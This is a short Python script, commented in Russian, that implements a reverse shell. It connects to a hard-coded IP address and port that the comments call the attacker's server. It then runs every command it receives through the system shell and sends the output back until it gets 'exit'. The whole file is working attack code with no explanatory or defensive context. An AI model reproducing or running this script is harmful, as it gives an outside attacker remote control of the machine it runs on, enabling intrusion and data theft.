import socket
import subprocess

server_ip = '95.165.8.178'  # Ваш IP-адрес (это будет IP вашего атакующего сервера)
server_port = 7777         # Порт, на котором будет слушать ваш сервер

# Создаем сокет для подключения к вашему серверу
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server_ip, server_port))

while True:
    command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
    if command.lower() == 'exit':
        break
    if command:
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(output.stdout + output.stderr)  # Отправляем результат выполнения команды обратно

s.close()
